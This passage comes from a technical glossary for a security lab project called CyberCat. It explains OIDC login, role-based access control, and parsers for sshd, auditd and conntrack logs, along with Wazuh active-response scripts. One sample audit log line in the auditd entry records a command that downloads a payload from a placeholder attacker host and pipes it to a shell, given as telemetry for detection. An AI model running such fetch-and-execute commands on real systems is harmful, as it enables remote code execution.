3. Now does the **token exchange** — backchannel POST to Google:

**Step 6** — CyberCat → Google (server-to-server, not via the browser):
```
POST /token HTTP/1.1
Host: oauth2.googleapis.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=4/0AVMBs...&
redirect_uri=https%3A%2F%2Fcybercat.local%2Fv1%2Fauth%2Foidc%2Fcallback&
client_id=cybercat-client-id&
client_secret=<the RP's secret with Google>
```

Response:
```json
{
  "access_token": "ya29.A0AeT...",
  "expires_in": 3599,
  "token_type": "Bearer",
  "id_token": "eyJhbGciOiJSUzI1NiIs..."   // ← THE JWT from the JWT entry above
}
```

The `id_token` is the JWT containing the user's identity claims. The `access_token` is for calling Google APIs on the user's behalf (CyberCat doesn't need this — it only wants to know who the user is).

**Step 7** — CyberCat validates the JWT:

```python
claims = validate_id_token(id_token, expected_nonce=nonce)
# Verifies signature against JWKS, exp, iss=Google, aud=our client_id, nonce matches our cookie
```

If the JWT's `nonce` doesn't match the one CyberCat put in the cookie, abort — someone is replaying an old token.

**Step 8** — CyberCat looks up or creates the local user:

```python
# Lookup order:
# 1. By oidc_subject (sub claim) — the IdP's stable ID for this user
# 2. Fallback: by email (handles users who created an account via password first, then linked OIDC)
# 3. JIT-create with role=read_only if neither matches
user = await upsert_oidc_user(db, sub=claims["sub"], email=claims["email"])
```

**Step 9** — CyberCat issues its own session cookie and redirects the user to `return_to`:

```
HTTP/1.1 303 See Other
Set-Cookie: cybercat_session=<HMAC-signed payload>; HttpOnly; Secure; SameSite=Lax
Location: /incidents
```

From here, every subsequent request carries CyberCat's own session cookie — Google is no longer in the loop. The OIDC dance is a one-time identity assertion; ongoing auth is local.

**Why two tokens (`access_token` + `id_token`)?** OAuth 2 (the parent spec) only had `access_token` — for calling APIs. OIDC added `id_token` (a JWT specifically for "tell the RP who this is"). They have different audiences, different scopes, different shapes. Most "Sign in with X" flows only care about `id_token`; only flows that also call the IdP's APIs (Calendar, Drive) use `access_token`.

**Why it exists:** Before OIDC, every site had its own custom "login with Google" implementation, often insecure. OIDC standardizes the dance — same endpoints, same JWT shape, same security properties — so any IdP works with any client library out of the box.

**Where in CyberCat:** `backend/app/auth/oidc.py` (full module — `discover_oidc()`, `make_authorization_url()`, `verify_state()`, `exchange_code_for_user_info()`, `upsert_oidc_user()`). Routes in `backend/app/auth/router.py`: `GET /v1/auth/oidc/login`, `GET /v1/auth/oidc/callback`. Feature-flagged via `OIDC_*` env vars; defaults to off so non-OIDC demos work unchanged.

**Where else you'll see it:** Every "Sign in with Google / Microsoft / Apple / GitHub" button is OIDC (or close cousin OAuth 2). Auth0, Okta, Keycloak, Google Workspace SSO are all OIDC providers.

**Tradeoffs:** Six moving parts (issuer, client, browser, redirect URI, state cookie, JWT validation) means six places to misconfigure — most production OIDC bugs are misconfigured `redirect_uri` or wrong audience. Discovery is network-dependent (CyberCat caches it at startup). The state/nonce pattern is critical defense against CSRF and replay — easy to skip, expensive when skipped.

**Related entries:** [JWT (JSON Web Tokens)](#jwt-json-web-tokens) · [HMAC session cookies](#hmac-session-cookies) · [RBAC](#rbac-role-based-access-control)

---

#### RBAC (role-based access control)
*Introduced: Phase 14 · Category: Auth & security*

**Intuition:** RBAC means each user has a *role* (e.g., admin, analyst, read-only), and the code checks the role — not the user — when deciding "can this user do that thing?" Add a new admin → they inherit every admin permission. No per-user permission edits needed.

**Precise:** Role-Based Access Control is a long-standing access pattern formalized by NIST in the 1990s. CyberCat has three roles (`admin`, `analyst`, `read_only`) stored as a Postgres ENUM on `users.role`. Authorization is implemented as **FastAPI dependencies** that compose: `require_user` (any authenticated), `require_analyst` (analyst or admin), `require_admin` (admin only). Routes declare what they need: `def transition(..., user: User = Depends(require_analyst))`. The dependency resolves the cookie/bearer, looks up the user, raises 403 if the role is insufficient.

**How it works (under the hood):**

**The role storage** — Postgres ENUM type:

```sql
CREATE TYPE user_role AS ENUM ('admin', 'analyst', 'read_only');
ALTER TABLE users ADD COLUMN role user_role NOT NULL DEFAULT 'read_only';
```

ENUM types are validated by Postgres itself — you can't insert `'manager'` because it's not in the type. Storage is one byte (an internal integer), not the string. Index-friendly, type-safe, and the values are part of the schema (visible in migrations, in the OpenAPI enum types).

**The dependency tree** in `backend/app/auth/dependencies.py`:

```python
# Layer 1 — auth resolution (cookie OR bearer OR SystemUser sentinel)
async def get_current_user(request: Request, db: AsyncSession = Depends(get_db)) -> User | None:
    if not SETTINGS.auth_required:
        return SystemUser()                  # bypass: existing demos run unchanged
    # ... cookie/bearer resolution as in the Bearer-tokens entry ...
    return user_or_none

# Layer 2 — gate "must be authenticated"
async def require_user(user: User | None = Depends(get_current_user)) -> User:
    if user is None:
        raise HTTPException(401, "authentication required")
    return user

# Layer 3 — gate "must be analyst or admin"
async def require_analyst(user: User = Depends(require_user)) -> User:
    if user.role not in (UserRole.analyst, UserRole.admin):
        raise HTTPException(403, "analyst or admin role required")
    return user

# Layer 4 — gate "must be admin"
async def require_admin(user: User = Depends(require_user)) -> User:
    if user.role != UserRole.admin:
        raise HTTPException(403, "admin role required")
    return user
```

Each layer **wraps the previous one via `Depends`**. FastAPI walks the chain top-down at request time, caches each result, and presents the final user to the handler. If `require_user` raises 401, none of the higher layers run.

**On every mutation route** you declare the bar:

```python
@router.post("/incidents/{id}/transitions")
async def transition_incident(
    id: UUID,
    body: TransitionRequest,
    db: AsyncSession = Depends(get_db),
    user: User = Depends(require_analyst),    # ← gate is here
) -> IncidentDetail:
    incident = await db.get(Incident, id)
    incident.status = body.new_status
    # Audit columns capture WHO did it
    db.add(IncidentTransition(
        incident_id=id, new_status=body.new_status,
        actor_user_id=user.id, reason=body.reason,
    ))
    await db.commit()
    return IncidentDetail.model_validate(incident, from_attributes=True)
```

**Audit-trail columns** are the second half of RBAC. Knowing "this user transitioned the incident" is as important as "this user was allowed to." Every mutating table has an `actor_user_id` FK:

```sql
ALTER TABLE action_logs       ADD COLUMN actor_user_id UUID REFERENCES users(id);
ALTER TABLE incident_transitions ADD COLUMN actor_user_id UUID REFERENCES users(id);
ALTER TABLE notes              ADD COLUMN actor_user_id UUID REFERENCES users(id);
```

These are nullable to support the legacy `SystemUser` sentinel (when `AUTH_REQUIRED=false`, audit rows get the `legacy@cybercat.local` user's UUID via `resolve_actor_id`).

**Why the system runs unauthenticated by default.** `SETTINGS.auth_required` defaults to `false` in dev and demo. With it off, `get_current_user` returns a `SystemUser` sentinel — every dep treats it as a valid analyst. This is how Phase 1–13's tests still pass: they were written before auth existed; the sentinel keeps them green. Production / shared deployments flip the flag to `true`, and the same code path enforces real auth.

**Why it exists:** Per-user ACLs (Alice can do X, Bob can do X, Carol can do X, ...) become unmanageable at scale. Roles bundle permissions into a few categories matching real job functions; assigning a role grants the bundle. Easier to reason about, easier to audit ("who can transition incidents?" → "all analysts and admins").

**Where in CyberCat:** `backend/app/auth/dependencies.py` — `require_user`, `require_analyst`, `require_admin`. Every mutation route uses `require_analyst`; admin-only routes (token revocation for other users, role changes) use `require_admin`. Audit columns (`actor_user_id` on `action_logs`, `incident_transitions`, `notes`) track who did what.

**Where else you'll see it:** Linux file permissions (owner/group/other is a mini-RBAC), AWS IAM (with extra fine-grained policies on top), Kubernetes RBAC, GitHub team permissions. Modern alternatives: ABAC (attribute-based — checks user attributes + resource attributes + action), ReBAC (relationship-based — like Google Zanzibar / SpiceDB).

**Tradeoffs:** Three roles is coarse — sometimes you want "can edit lab assets but not transition incidents," which would need a fourth role or per-resource grants. Production XDR/SOAR tools often have 10+ roles. CyberCat keeps it intentionally small (the `Project Brief` rules out enterprise auth complexity).

**Related entries:** [HMAC session cookies](#hmac-session-cookies) · [Bearer tokens](#bearer-tokens-api-tokens) · [OIDC](#oidc-openid-connect)

---

### Telemetry sources

#### sshd auth events
*Introduced: Phase 16 · Category: Telemetry sources*

**Intuition:** Every time someone tries to SSH into a Linux host, sshd writes a one-line entry to `/var/log/auth.log` saying who tried, from where, and whether it worked. Tail that file, parse the lines, and you have a real-time feed of "who's logging in (and failing) on this box."

**Precise:** OpenSSH's `sshd` daemon authenticates incoming SSH connections via PAM (Pluggable Authentication Modules), and PAM logs the result through syslog into `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL). Lines look like `Apr 28 10:14:22 lab-debian sshd[1234]: Failed password for invalid user admin from 10.0.0.5 port 54321 ssh2`. CyberCat's agent regex-parses these into four canonical event kinds: `auth.failed`, `auth.succeeded`, `session.started`, `session.ended`.

**How it works (under the hood):**

**The four sshd line shapes** the agent recognizes (real examples from a test run):

```
# Failed password attempt against an invalid user:
Apr 28 10:14:22 lab-debian sshd[1234]: Failed password for invalid user admin from 10.0.0.5 port 54321 ssh2

# Failed password against a real user:
Apr 28 10:14:23 lab-debian sshd[1234]: Failed password for oziel from 10.0.0.5 port 54322 ssh2

# Successful auth (note "Accepted"):
Apr 28 10:15:00 lab-debian sshd[1245]: Accepted publickey for oziel from 10.0.0.5 port 54400 ssh2: RSA SHA256:xyz...

# Session start (PAM session module):
Apr 28 10:15:00 lab-debian sshd[1245]: pam_unix(sshd:session): session opened for user oziel(uid=1000) by (uid=0)

# Session end:
Apr 28 10:30:42 lab-debian sshd[1245]: pam_unix(sshd:session): session closed for user oziel
```

Note the syslog prefix: `<month> <day> <HH:MM:SS> <hostname> <process>[<pid>]: <msg>`. The first five tokens are syslog metadata; everything after the colon is the message sshd actually wrote. CyberCat's parser strips the prefix and matches on the message.

**The regex parsing** (sshd parser, simplified):

```python
# agent/cct_agent/parsers/sshd.py
import re

_FAILED = re.compile(
    r"Failed password for (?:invalid user )?(?P<user>\S+) from (?P<ip>\S+) port (?P<port>\d+)"
)
_ACCEPTED = re.compile(
    r"Accepted (?P<method>publickey|password) for (?P<user>\S+) from (?P<ip>\S+) port (?P<port>\d+)"
)
_SESSION_OPEN = re.compile(r"session opened for user (?P<user>\S+)\(uid=(?P<uid>\d+)\)")
_SESSION_CLOSE = re.compile(r"session closed for user (?P<user>\S+)")

def parse_line(line: str) -> dict | None:
    if (m := _FAILED.search(line)):
        return {"kind": "auth.failed", "user": m["user"], "src_ip": m["ip"], "method": "password"}
    if (m := _ACCEPTED.search(line)):
        return {"kind": "auth.succeeded", "user": m["user"], "src_ip": m["ip"], "method": m["method"]}
    if (m := _SESSION_OPEN.search(line)):
        return {"kind": "session.started", "user": m["user"], "uid": int(m["uid"])}
    if (m := _SESSION_CLOSE.search(line)):
        return {"kind": "session.ended", "user": m["user"]}
    return None
```

Each compiled regex captures named groups; the function tries each in order and returns the first match. Unmatched lines (sshd writes a lot of noise) return None and get dropped.

**The PAM layer** is worth knowing about. `Failed password` is logged by sshd directly. `session opened/closed` is logged by `pam_unix.so` — sshd delegates session bookkeeping to PAM, which is what writes those lines. PAM is the standard Linux mechanism for "what to do at auth time" (try keys, try password, check expirations, log the session). If you ever swap sshd for another auth daemon, PAM lines look the same; only the daemon-specific lines change.

**Why this is the cheapest possible signal.** Every Linux server already runs sshd, already writes auth.log, already has the format documented across distros. No agent install, no kernel module, no privileged probe. CyberCat's agent just needs read access to `/var/log/auth.log` (which the lab-debian container shares via a named volume).

**Format drift across distros** is the biggest production gotcha. Ubuntu 22 sshd 8.9 might write `for invalid user admin`; Ubuntu 24 sshd 9.6 might write `for invalid user 'admin'` (quoted). Tests (`agent/tests/test_sshd_parser.py`) pin sample fixtures from each distro version the agent claims to support.

**Why it exists:** Failed-login bursts are the textbook signal of credential brute-force (MITRE T1110) — and the cheapest possible signal to collect. If you only had room for one telemetry source, this would be it.

**Where in CyberCat:** `agent/cct_agent/parsers/sshd.py` (regex parser), `agent/cct_agent/sources/sshd_source.py` (tail loop), `agent/cct_agent/events.py` (canonical builder). Detection: `backend/app/detection/rules/auth_failed_burst.py` (≥4 failures/60s/user) and `auth_anomalous_source_success.py`.

**Where else you'll see it:** Wazuh, Splunk Universal Forwarder, Filebeat, Fluentd — every log shipper has a built-in sshd parser. fail2ban is a focused single-purpose consumer of the same log. Cloud SSH (AWS Session Manager, GCP IAP) replaces sshd with platform logs but the event taxonomy is the same.

**Tradeoffs:** Log format varies subtly between distros and sshd versions — a regex that works on Ubuntu 22 may miss something on RHEL 9. Solution is per-distro rules + integration tests. Logs lie if the attacker has root (they can edit `auth.log`); for high-assurance you'd ship to a remote log host or use audit rules.

**Related entries:** [auditd](#auditd-execve--syscall--eoe) · [Tail-and-checkpoint pattern](#tail-and-checkpoint-pattern) · [MITRE ATT&CK](#mitre-attck-tactics-techniques-subtechniques)

---

#### auditd (EXECVE / SYSCALL / EOE)
*Introduced: Phase 16.9 · Category: Telemetry sources*

**Intuition:** auditd is the Linux kernel's built-in process-tracing system. You write rules saying "tell me every time anyone runs a command" and it logs each `execve()` system call to `/var/log/audit/audit.log` — split into multiple lines per event that you have to reassemble.

**Precise:** Linux's audit subsystem is a kernel facility that emits structured records to userspace. `auditd` (the daemon) writes them to `audit.log`. A single process-execution event arrives as **multiple records sharing an event ID** — `SYSCALL` (which syscall, with which return code), `EXECVE` (the full argv), `PATH` (each path the syscall touched), `PROCTITLE` (the original command line), terminated by an `EOE` (end-of-event) marker. Parsers must buffer records by `audit(timestamp:event_id)` and flush on EOE.

**How it works (under the hood):**

**A real `execve` event** as it appears in `/var/log/audit/audit.log` (one execution → five lines):

```
type=SYSCALL    msg=audit(1714312800.123:42): arch=c000003e syscall=59 success=yes exit=0 a0=55a... a1=55b... a2=55c... ppid=1234 pid=5678 auid=1000 uid=1000 gid=1000 euid=1000 comm="bash" exe="/usr/bin/bash" key=(null)
type=EXECVE     msg=audit(1714312800.123:42): argc=3 a0="bash" a1="-c" a2="curl http://evil.example/payload | sh"
type=PATH       msg=audit(1714312800.123:42): item=0 name="/usr/bin/bash" inode=12345 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00
type=PATH       msg=audit(1714312800.123:42): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=23456 ...
type=PROCTITLE  msg=audit(1714312800.123:42): proctitle=626173680A2D630A6375726C20687474703A2F2F65...
type=EOE        msg=audit(1714312800.123:42):
```

The key field is `audit(<unix_ts>:<event_id>)` — `42` here is the kernel-assigned event ID. **Every line for the same event shares this ID.** A parser must group lines by ID until it sees the `type=EOE` marker, then flush the assembled event.

**Why split into multiple records.** Each kernel record has a fixed maximum size (~8KB). A long argv (`a2=...long-command...`) can't fit in the SYSCALL record, so it gets its own EXECVE record. Same for PATH (multiple files touched = multiple PATH records). Splitting also keeps the kernel side simple — emit small structured records, let userspace assemble.

**Field decoding gotchas:**

- `proctitle=` is the original command line, **hex-encoded with embedded NUL bytes** (the bytes between argv elements). Decode with `bytes.fromhex(...)` then split on `\x00`.
- `a0`, `a1`, `a2` in EXECVE are the argv elements, ordered. `argc=3` tells you how many.
- `arch=c000003e` is x86-64; you usually filter on `syscall=59` (the `execve` syscall on x86-64) or `syscall=322` (`execveat`).
- `exe=` is the resolved path of the binary; `comm=` is the truncated process name (16 chars max — the kernel-side limit).
- Quoted values with non-ASCII or special chars get hex-encoded; unquoted plain identifiers are literal.

**The CyberCat parser** is stateful by necessity:

```python
# agent/cct_agent/parsers/auditd.py (simplified)
class AuditdParser:
    def __init__(self):
        self._buffer: dict[tuple[float, int], list[dict]] = {}   # (ts, event_id) → records

    def feed(self, line: str) -> Iterator[dict]:
        rec = self._parse_line(line)
        if rec is None:
            return
        key = (rec["ts"], rec["event_id"])
        self._buffer.setdefault(key, []).append(rec)
        if rec["type"] == "EOE":
            assembled = self._assemble(self._buffer.pop(key))
            if assembled:
                yield assembled

    def _assemble(self, records: list[dict]) -> dict | None:
        syscall = next((r for r in records if r["type"] == "SYSCALL"), None)
        execve = next((r for r in records if r["type"] == "EXECVE"), None)
        if not syscall or not execve or syscall["syscall"] != "59":
            return None
        return {
            "kind": "process.created",
            "ts": syscall["ts"],
            "pid": int(syscall["pid"]),
            "ppid": int(syscall["ppid"]),
            "uid": int(syscall["uid"]),
            "exe": syscall["exe"],
            "argv": [execve[f"a{i}"] for i in range(int(execve["argc"]))],
        }
```

The buffer holds in-flight events; EOE is the trigger to flush. If lines arrive out of order or an EOE is missing, entries can leak — production parsers add a TTL on entries to evict stale partials.

**The `TrackedProcesses` LRU** in `agent/cct_agent/process_state.py` does the second-pass enrichment. When a `process.created` event is assembled, it remembers `(pid, exe)` in a bounded LRU (4096 entries). On `process.exited`, it looks up the PID — if found, emit; if not (process started before we were running), drop. This **gates** exit events to ones we actually saw start, defeating PID reuse (PID 1234 might be a different process today than yesterday). It also lets `process.created` enrich with `parent_image` from the parent PID's earlier entry.

**Audit rules** (separate from log parsing) tell the kernel *what* to record. CyberCat installs rules like:

```
-a always,exit -F arch=b64 -S execve,execveat -k cct_proc
```

"Always log every execve and execveat call on x86-64; tag matches with key `cct_proc`." The `-k` is grep-friendly; CyberCat's parser ignores the key but you'll see it in any operational debugging.

**Why it exists:** Process-creation visibility is the second-most-valuable endpoint signal (after auth). If you can see what processes are spawning what (especially `bash` spawning from `winword.exe` — encoded PowerShell, wgetting from suspicious IPs, etc.), you can detect a huge fraction of post-compromise behavior. auditd is the kernel-level source of truth — much harder to bypass than userspace hooks.

**Where in CyberCat:** `agent/cct_agent/parsers/auditd.py` (`AuditdParser` — stateful, buffers by event ID, flushes on EOE). `agent/cct_agent/process_state.py` (`TrackedProcesses` LRU of 4096 PIDs to enrich `process.created` with parent_image and gate `process.exited`). `agent/cct_agent/sources/auditd_source.py` (tail loop, gated by `CCT_AUDIT_ENABLED` + path-exists check). Detection: `backend/app/detection/rules/process_suspicious_child.py`.

**Where else you'll see it:** Wazuh's auditd integration, Sysdig Falco (different mechanism — eBPF — but same goal), CrowdStrike / SentinelOne (proprietary kernel agents). Windows equivalent is Sysmon EventID 1 (`process create`).

**Tradeoffs:** auditd doesn't run inside Docker Desktop on Windows (no real Linux kernel). CyberCat's agent gracefully degrades when the audit subsystem is missing; smoke tests inject synthetic logs. Audit rules can become noisy fast — every `ls` is an `execve` — so you scope rules carefully. PID reuse means a `process.exited` event for PID 1234 might not be the same process as the earlier `process.created`; the `TrackedProcesses` LRU mitigates this.

**Related entries:** [sshd auth events](#sshd-auth-events) · [conntrack](#conntrack-connection-state-tracking) · [MITRE ATT&CK](#mitre-attck-tactics-techniques-subtechniques)

---

#### conntrack (connection state tracking)
*Introduced: Phase 16.10 · Category: Telemetry sources*

**Intuition:** conntrack is the Linux kernel's "I remember every active network connection" table. Run `conntrack -E -e NEW` and the kernel will print a line every time a new connection (TCP handshake, UDP flow, etc.) starts.

**Precise:** Linux's netfilter framework includes a connection-tracking module (`nf_conntrack`) that maintains state for every active flow — the same state used by NAT and stateful firewalls (`iptables -m state`). The userspace tool `conntrack -E` (event mode) streams state-table changes (`[NEW]`, `[UPDATE]`, `[DESTROY]`) to stdout. CyberCat captures `[NEW]` events only and emits canonical `network.connection` events with src_ip, dst_ip, src_port, dst_port, proto. Loopback (`127.0.0.0/8`, `::1`) and link-local (`169.254/16`, `fe80::/10`) records are dropped at the parser to control volume.

**How it works (under the hood):**

**A real conntrack event line** as written by `conntrack -E -e NEW -o timestamp -o extended -o id`:

```
[1714312800.123456]	[NEW] tcp	6 120 SYN_SENT src=10.0.0.5 dst=192.0.2.10 sport=54321 dport=443 [UNREPLIED] src=192.0.2.10 dst=10.0.0.5 sport=443 dport=54321 mark=0 zone=0 use=1 id=1234567890
```

Tab-separated fields. Decoded:

- `[1714312800.123456]` — Unix timestamp with microseconds (from `-o timestamp`).
- `[NEW]` — event type (we capture only NEW; UPDATE and DESTROY are noise for our use case).
- `tcp 6` — protocol name and number (TCP=6, UDP=17, ICMP=1).
- `120 SYN_SENT` — TTL of the conntrack entry, current TCP state.
- First `src/dst/sport/dport` — the **outbound** flow as the kernel saw it (10.0.0.5:54321 → 192.0.2.10:443).
- `[UNREPLIED]` — the return-direction reply hasn't arrived yet.
- Second `src/dst/sport/dport` — what the **expected** reply will look like (NAT-aware).
- `id=1234567890` — kernel's stable ID for this conntrack entry. Used as the dedup key.

**The parser** is stateless (one line in, one event out, no buffering):

```python
# agent/cct_agent/parsers/conntrack.py (simplified)
import re

_LINE = re.compile(
    r"\[(?P<ts>\d+\.\d+)\]\s+\[NEW\]\s+(?P<proto>\w+)\s+\d+\s+\d+\s+\S+\s+"
    r"src=(?P<src>\S+)\s+dst=(?P<dst>\S+)\s+sport=(?P<sport>\d+)\s+dport=(?P<dport>\d+).*?"
    r"id=(?P<id>\d+)"
)

_DROP_NETS = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("fe80::/10"),
]

def parse_line(line: str) -> dict | None:
    m = _LINE.search(line)
    if not m:
        return None
    src = ipaddress.ip_address(m["src"])
    dst = ipaddress.ip_address(m["dst"])
    if any(src in n or dst in n for n in _DROP_NETS):
        return None     # filter out loopback/link-local at parser
    return {
        "kind": "network.connection",
        "ts": float(m["ts"]),
        "proto": m["proto"],
        "src_ip": str(src),
        "dst_ip": str(dst),
        "src_port": int(m["sport"]),
        "dst_port": int(m["dport"]),
        "conntrack_id": int(m["id"]),
    }
```

**Volume control by parser-level drops.** A busy host can produce thousands of new flows per second. Loopback alone (services chatting to each other on `127.0.0.1`) accounts for most of it on a typical app server. Filtering at the parser is dramatically cheaper than shipping everything and filtering downstream — bytes never leave the agent.

**Dedup by conntrack `id=`** when present, falls back to a SHA-256 of the raw line. The kernel ID is stable for the lifetime of the entry, so two reads of the same line (after a checkpoint replay, say) produce the same event — letting the dedup layer drop duplicates cleanly.

**Why `NET_ADMIN` is required.** Reading the conntrack table from `/proc/net/nf_conntrack` is allowed for any user, but `conntrack -E` (event mode) opens a netlink socket that requires `CAP_NET_ADMIN`. The lab-debian container has `NET_ADMIN` already because it's the lab — running on the operator's host would not. This is one of several reasons the conntrack source can't ship outside the lab container.

**The flow that closes the response loop:**

1. Analyst executes `block_observable` action with value `192.0.2.10`.
2. Handler updates `blocked_observables` table, invalidates Redis cache, optionally dispatches Wazuh AR to `iptables -I INPUT DROP -s 192.0.2.10`.
3. Sometime later, lab-debian initiates a connection to `192.0.2.10:443` (some malware beaconing back to its C2).
4. conntrack logs the `[NEW]` event → parser → `network.connection` event POSTed to backend.
5. `blocked_observable` detector queries Redis (cache hit), sees `192.0.2.10` is in the active blocks, fires `py.blocked_observable_match`.
6. Correlator extends the existing incident with this new detection — the analyst sees "post-block beacon attempt from <host>" appear under the incident's evidence.

That's the triple — auth → process → network — closing the loop.

**Why it exists:** Network egress visibility closes the loop on the `block_observable` response action — when you block an IP via `iptables -I INPUT DROP`, you also want to detect future attempted connections to that IP from inside the network so you can correlate them back to the active incident. This is the third leg of the endpoint trio (auth → process → network).

**Where in CyberCat:** `agent/cct_agent/parsers/conntrack.py` (stateless line parser). `agent/cct_agent/sources/conntrack_source.py` (tail loop on `/var/log/conntrack.log`, gated by `CCT_CONNTRACK_ENABLED`). lab-debian runs `conntrack -E -e NEW -o timestamp -o extended -o id` under its existing `NET_ADMIN` capability and writes to the file. Detection: `backend/app/detection/rules/blocked_observable.py` matches against the `blocked_observables` table.

**Where else you'll see it:** Suricata, Zeek (formerly Bro), pfSense, OPNsense, AWS VPC Flow Logs (different mechanism but same data), Kubernetes Calico's flow logs. Anything doing network forensics or DPI hooks into conntrack-style state.

**Tradeoffs:** Requires `NET_ADMIN` capability — same reason it needs to live inside the lab container, not on the host. Volume can be huge on busy hosts; the loopback/link-local drops + dedup by `id=` keep it manageable. The agent uses a SHA-256 of the raw line as a dedup fallback when `id=` is absent.

**Related entries:** [auditd](#auditd-execve--syscall--eoe) · [Tail-and-checkpoint pattern](#tail-and-checkpoint-pattern) · [Wazuh Active Response](#wazuh-active-response)

---

#### Wazuh Active Response
*Introduced: Phase 11 · Category: Telemetry sources / Response*

**Intuition:** Wazuh Active Response (AR) is the mechanism that lets a SIEM-style central manager tell an installed agent on a host: "run script X with args Y." CyberCat uses it to actually execute `iptables -I INPUT DROP <ip>` or `kill -9 <pid>` inside the lab container instead of merely recording an intent.

**Precise:** Wazuh's manager exposes a REST API (`PUT /active-response`) that accepts `{agent: <id>, command: <ar-command-name>, arguments: [...]}`. Each agent has a `ossec.conf` `<active-response>` block declaring which named commands it will execute. When the manager dispatches, the agent runs the configured script with the args, captures stdout/stderr/exit code, and reports back. CyberCat's dispatcher (`backend/app/response/dispatchers/wazuh_ar.py`) handles auth (token cache with 270s TTL, single 401 retry), timeouts (5s connect / 10s read), and never logs the Authorization header.

**How it works (under the hood):**

**The Wazuh AR pipeline** has three parts:

```
CyberCat backend → Wazuh manager → Wazuh agent → script execution → result
   (REST POST)       (re-emits as       (runs the          (target process /
                     internal cmd)       configured         iptables / file)
                                          script)
```

**Step 1 — get an auth token.** Wazuh's API uses short-lived (300s) JWT-style bearer tokens.

```python
# Cached for 270s (under the 300s expiry, with safety margin)
async def _get_token() -> str:
    if _cached and _cached["expires_at"] > time.time():
        return _cached["token"]
    resp = await http.post(
        f"{WAZUH_API}/security/user/authenticate",
        auth=BasicAuth(WAZUH_API_USER, WAZUH_API_PASS),
        timeout=Timeout(connect=5.0, read=10.0),
    )
    token = resp.json()["data"]["token"]
    _cached = {"token": token, "expires_at": time.time() + 270}
    return token
```

The cache is process-local. Concurrent ingest paths share the cached token; only one in 4-5 minutes goes through the auth call.

**Step 2 — send the AR request:**

```python
async def dispatch(agent_id: str, command: str, arguments: list[str]) -> dict:
    token = await _get_token()
    body = {"command": command, "arguments": arguments, "alert": {}}
    try:
        resp = await http.put(
            f"{WAZUH_API}/active-response?agents_list={agent_id}",
            headers={"Authorization": f"Bearer {token}"},     # NEVER logged
            json=body,
            timeout=Timeout(connect=5.0, read=10.0),
        )
    except (httpx.ReadTimeout, httpx.ConnectTimeout) as e:
        return {"status": "transport_error", "reason": str(e)}

    if resp.status_code == 401:
        # Token rotated mid-flight; retry once with a fresh token
        _cached = None
        return await dispatch(agent_id, command, arguments)

    return {"status": "ok" if resp.status_code < 300 else "error",
            "code": resp.status_code,
            "body": resp.json()}
```

**Step 3 — the agent runs the configured script.** Each Wazuh agent has `ossec.conf` declaring which named AR commands it will accept and which script implements each:

```xml
<active-response>
  <command>kill-process</command>
  <location>local</location>
  <timeout_allowed>no</timeout_allowed>
</active-response>

<command>
  <name>kill-process</name>
  <executable>kill-process.sh</executable>
  <timeout_allowed>no</timeout_allowed>
</command>
```

The script lives at `/var/ossec/active-response/bin/kill-process.sh` on the agent. CyberCat ships a custom one for `kill_process_lab`:

```bash
#!/bin/sh
# /var/ossec/active-response/bin/kill-process.sh (simplified)
# Args from manager: <pid> <expected_proc_name>

PID="$1"
EXPECTED="$2"

# Defeat PID reuse: confirm /proc/<pid>/cmdline still matches expected name
ACTUAL=$(tr '\0' ' ' < /proc/"$PID"/cmdline 2>/dev/null | awk '{print $1}')
if [ "$(basename "$ACTUAL")" != "$EXPECTED" ]; then
    echo "PID $PID is now $ACTUAL, not $EXPECTED — refusing"
    exit 2
fi

kill -9 "$PID"
exit $?
```

The PID-reuse defense is the important bit: between when the analyst clicked "kill" and when the AR script runs, the original process might have exited and PID 1234 might now be a totally different program. Reading `/proc/<pid>/cmdline` and validating against the expected name prevents killing the wrong thing.

**Step 4 — result classification.** The dispatcher's return shape feeds CyberCat's executor, which tags the action result:

| Result | Meaning |
|---|---|
| `ok` | DB state committed, AR succeeded |
| `partial` | DB state committed, AR failed (transport error or non-2xx) |
| `error` | DB state failed (rolled back) |

`partial` is rendered as an amber badge in the UI with a tooltip: "DB state was updated but the network action did not confirm. Check the host." This is honest UX — pretending success when AR failed would be the wrong thing.

**Why the never-log-Authorization rule.** Bearer tokens in logs are a recurring source of breaches (logs end up in S3 buckets, error trackers, or copy-pasted into tickets). The dispatcher uses a custom `httpx` event-hook to redact the `Authorization` header before any log-friendly representation of the request is built.

**Why it exists:** Detection without response is a half-product. AR is the bridge from "we noticed" to "we acted." CyberCat ships its own response framework (the executor + handlers), but `quarantine_host_lab` and `kill_process_lab` need to actually touch the host — for which it dispatches via Wazuh AR (flag-gated by `WAZUH_AR_ENABLED`, default off).

**Where in CyberCat:** `backend/app/response/dispatchers/wazuh_ar.py`. Handlers `quarantine_host_lab` (dispatches `firewall-drop0`, Wazuh's built-in `iptables` block) and `kill_process_lab` (dispatches the custom `kill-process.sh` which validates `/proc/<pid>/cmdline` against the requested process name to defeat PID reuse before `kill -9`). On dispatch failure with DB success, the action result is `partial` — rendered as an amber badge in the UI.

**Where else you'll see it:** EDR vendors (CrowdStrike Real Time Response, SentinelOne Singularity, Microsoft Defender Live Response) all have the same shape: central console pushes commands to installed agents. Wazuh is the open-source incarnation.

**Tradeoffs:** AR is the only path in CyberCat for real OS-level effects (the custom agent is **telemetry-only by design** per ADR-0011). It requires the full Wazuh stack (manager + indexer + agent), which is ~1.8 GB of additional containers. The custom agent + AR is **not** wired and **must not** be wired without an explicit ADR — host-safety boundary.

**Related entries:** [Action classification](#action-classification-auto-safe--suggest-only--reversible--disruptive) · [Pluggable telemetry adapter pattern](#pluggable-telemetry-adapter-pattern)

---

### Detection

#### Sigma rule format
*Introduced: Phase 4 · Category: Detection*

**Intuition:** Sigma is a YAML-based detection rule language — a vendor-neutral way to write "if a process named `mimikatz.exe` is created, that's bad" once and run it against any log source (Splunk, Elastic, Wazuh, your own engine).

**Precise:** A Sigma rule has a `detection` block with `selection` clauses (key-value matches, lists for ORs, wildcards) and a `condition` line (boolean expression over selection names). A `logsource` block declares the data source (`product: linux`, `category: process_creation`). Backends compile Sigma to whatever query language the target platform speaks. CyberCat ships its own backend (`backend/app/detection/sigma/`) — parser, compiler, and field_map — that turns Sigma rules into Python predicates evaluated against canonical events.

**How it works (under the hood):**

